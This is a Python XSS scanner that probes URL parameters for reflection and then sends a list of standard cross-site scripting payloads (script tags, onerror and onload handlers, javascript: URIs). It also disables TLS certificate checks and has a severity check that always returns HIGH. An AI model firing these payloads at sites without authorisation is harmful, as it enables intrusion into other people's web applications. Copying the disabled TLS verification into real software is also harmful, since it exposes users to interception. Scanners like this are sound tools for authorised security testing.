"""
XSS scanner with reflection detection.
"""
import requests
import re
import uuid
from typing import List, Dict
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

class XSSScanner:
    def __init__(self):
        self.payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "'-alert(1)-'",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "<body onload=alert(1)>",
            "<iframe src=\"javascript:alert(1)\">",
        ]
        
        self.context_payloads = {
            "html": "<{canary}test{canary}>",
            "attribute": "\"{canary}",
            "script": "';{canary}//",
            "url": "javascript:{canary}",
        }
    
    def scan_param(self, url: str, param: str) -> List[Dict]:
        """Scan parameter for XSS."""
        findings = []
        
        # First, check for reflection
        canary = f"xss{uuid.uuid4().hex[:8]}"
        reflection = self._check_reflection(url, param, canary)
        
        if not reflection["reflected"]:
            return findings
        
        # Test payloads based on context
        for payload in self.payloads:
            result = self._test_payload(url, param, payload, canary)
            if result["vulnerable"]:
                findings.append({
                    "type": "xss_reflected",
                    "url": url,
                    "parameter": param,
                    "payload": payload,
                    "context": reflection["context"],
                    "evidence": result["evidence"],
                    "severity": "MEDIUM" if "httponly" in str(result.get("cookies", "")).lower() else "HIGH"
                })
                break
        
        return findings
    
    def _check_reflection(self, url: str, param: str, canary: str) -> Dict:
        """Check if input is reflected and in what context."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if param not in params:
            return {"reflected": False}
        
        params[param] = [canary]
        new_query = urlencode(params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        try:
            resp = requests.get(test_url, timeout=10, verify=False)
            if canary in resp.text:
                context = self._detect_context(resp.text, canary)
                return {"reflected": True, "context": context}
        except:
            pass
        
        return {"reflected": False}
    
    def _detect_context(self, html: str, canary: str) -> str:
        """Detect reflection context."""
        idx = html.find(canary)
        if idx == -1:
            return "unknown"
        
        before = html[max(0, idx-50):idx]
        
        if re.search(r'<script[^>]*>[^<]*$', before, re.I):
            return "script"
        elif re.search(r'=["\'][^"\']*$', before):
            return "attribute"
        elif re.search(r'href\s*=\s*["\']?$', before, re.I):
            return "url"
        else:
            return "html"
    
    def _test_payload(self, url: str, param: str, payload: str, canary: str) -> Dict:
        """Test XSS payload."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        
        new_query = urlencode(params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        try:
            resp = requests.get(test_url, timeout=10, verify=False)
            
            # Check if payload rendered unescaped
            dangerous_patterns = [
                r'<script[^>]*>alert\(1\)</script>',
                r'onerror\s*=\s*alert\(1\)',
                r'onload\s*=\s*alert\(1\)',
                r"javascript:\s*alert\(1\)",
            ]
            
            for pattern in dangerous_patterns:
                if re.search(pattern, resp.text, re.I):
                    return {"vulnerable": True, "evidence": f"Payload reflected: {payload[:50]}"}
        except:
            pass
        
        return {"vulnerable": False}
